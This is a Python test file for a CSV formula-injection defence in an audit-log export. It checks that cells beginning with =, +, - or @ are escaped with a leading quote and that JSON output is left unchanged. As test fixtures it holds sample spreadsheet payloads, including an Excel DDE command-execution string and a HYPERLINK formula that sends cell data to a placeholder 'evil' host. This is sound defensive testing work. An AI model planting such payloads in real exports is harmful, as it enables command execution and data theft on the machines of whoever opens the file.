"""N25 (2026-06-21) — CSV formula-injection defense for the GRC export.

Excel / LibreOffice / Numbers auto-execute any cell whose first
character is one of =, +, -, @ as a formula on open. The GRC export
includes user-influenced fields (tool name, reason) so a crafted MCP
tool registration could land a SSRF or file-disclosure formula in the
csv the buyer's auditor opens.

The fix lives in services/audit/grc_export.py: prepend a single quote
to any string cell that starts with one of those prefixes, and switch
the writer to QUOTE_ALL for extra parser-safety.

Tests cover:
  * the pure helper _escape_formula
  * end-to-end build_grc_export(output='csv') leaves no executable cell
  * QUOTE_ALL is used (every cell wrapped in double-quotes)
  * benign content is unchanged
  * JSON output is NOT mutated — it's structured data, formula injection
    only affects spreadsheet parsing
"""
from __future__ import annotations

import csv
import io
import uuid
from datetime import UTC, datetime
from types import SimpleNamespace

import pytest

from services.audit.grc_export import (
    _escape_formula,
    _FORMULA_PREFIXES,
    build_grc_export,
)


def _fake_audit_row(
    *,
    tool: str = "tool.sql_query",
    reason: str = "denied by rule X",
) -> SimpleNamespace:
    """Build a fake AuditLog row shaped exactly how grc_export reads it."""
    return SimpleNamespace(
        id=uuid.uuid4(),
        tenant_id=uuid.UUID("00000000-0000-0000-0000-00000000aaaa"),
        agent_id=uuid.UUID("00000000-0000-0000-0000-00000000bbbb"),
        action="execute_tool",
        tool=tool,
        decision="deny",
        reason=reason,
        timestamp=datetime(2026, 6, 21, 14, 33, 21, tzinfo=UTC),
        event_hash="a" * 64,
    )


_TRIVIAL_MAPPING = {"eu_ai_act": ["Article 12"]}


# --------------------------------------------------------------------------- #
# _escape_formula                                                              #
# --------------------------------------------------------------------------- #


class TestEscapeFormula:
    @pytest.mark.parametrize("payload", [
        "=cmd|'/c calc'!A1",        # Excel DDE injection
        "+1+1+cmd",
        "-1+1+cmd",
        "@SUM(A1:A10)",
        "=HYPERLINK(\"http://evil/?x=\"&A1)",
    ])
    def test_dangerous_prefix_is_defanged(self, payload: str) -> None:
        out = _escape_formula(payload)
        assert isinstance(out, str)
        assert out.startswith("'")
        assert out[1:] == payload

    @pytest.mark.parametrize("payload", [
        "tool.sql_query",
        "denied by policy X",
        "incident-1234",
        "",  # empty string is safe — no first character to interpret
        "  =leading whitespace",  # whitespace breaks the formula rule
    ])
    def test_benign_input_is_unchanged(self, payload: str) -> None:
        assert _escape_formula(payload) == payload

    def test_non_string_passes_through(self) -> None:
        for v in [None, 0, 42, 3.14, True, [], {}]:
            assert _escape_formula(v) == v

    def test_all_documented_prefixes_are_covered(self) -> None:
        # If someone trims _FORMULA_PREFIXES without updating tests, fail loud.
        assert set(_FORMULA_PREFIXES) == {"=", "+", "-", "@"}


# --------------------------------------------------------------------------- #
# build_grc_export — end to end                                               #
# --------------------------------------------------------------------------- #


class TestBuildGrcExportCsv:
    def test_malicious_tool_name_is_defanged_in_csv(self) -> None:
        """A tool whose name starts with '=' lands as \"'=evil(...)\" in CSV."""
        row = _fake_audit_row(tool="=cmd|'/c calc'!A1")
        out = build_grc_export([row], {row.id: _TRIVIAL_MAPPING}, output="csv")
        assert isinstance(out, str)
        # Round-trip-parse the CSV and locate the tool column.
        reader = csv.DictReader(io.StringIO(out))
        records = list(reader)
        assert records, "expected at least one row in the CSV"
        # The tool cell must NOT begin with '=' — it must begin with "'".
        for r in records:
            assert not r["tool"].startswith("="), (
                f"formula injection slipped through: {r['tool']!r}"
            )
            assert r["tool"] == "'=cmd|'/c calc'!A1"

    def test_malicious_reason_is_defanged_in_csv(self) -> None:
        row = _fake_audit_row(reason="@SUM(A1:A100)")
        out = build_grc_export([row], {row.id: _TRIVIAL_MAPPING}, output="csv")
        # `reason` doesn't appear in the GRC row schema directly, but the
        # summary field interpolates `reason` text — make sure no cell in
        # the row begins with one of the dangerous prefixes after the fix.
        reader = csv.DictReader(io.StringIO(out))
        for r in reader:
            for col, val in r.items():
                assert not (val and val[0] in _FORMULA_PREFIXES), (
                    f"unescaped formula in column {col!r}: {val!r}"
                )

    def test_csv_uses_quote_all(self) -> None:
        row = _fake_audit_row()
        out = build_grc_export([row], {row.id: _TRIVIAL_MAPPING}, output="csv")
        lines = out.splitlines()
        assert len(lines) >= 2
        # Header line and data line: every comma-separated field is wrapped
        # in double-quotes when QUOTE_ALL is in effect.
        header_cells = lines[0].split(",")
        for cell in header_cells:
            assert cell.startswith('"') and cell.endswith('"'), (
                f"header cell {cell!r} not QUOTE_ALL-wrapped"
            )

    def test_empty_records_emit_quoted_header(self) -> None:
        """No rows in scope still returns a header-only CSV — and it's QUOTE_ALL."""
        out = build_grc_export([], {}, output="csv")
        assert isinstance(out, str)
        first_line = out.splitlines()[0]
        cells = first_line.split(",")
        for cell in cells:
            assert cell.startswith('"') and cell.endswith('"')

    def test_json_output_is_NOT_mutated_by_formula_guard(self) -> None:
        """JSON downstream is consumed by GRC-platform parsers, not Excel.
        Mutating the field there would break the auditor pivot. The guard
        is CSV-only."""
        row = _fake_audit_row(tool="=evil(payload)")
        records = build_grc_export(
            [row], {row.id: _TRIVIAL_MAPPING}, output="json",
        )
        assert isinstance(records, list)
        assert records, "expected at least one evidence record"
        # Original tool name preserved exactly in the JSON path.
        assert records[0]["tool"] == "=evil(payload)"
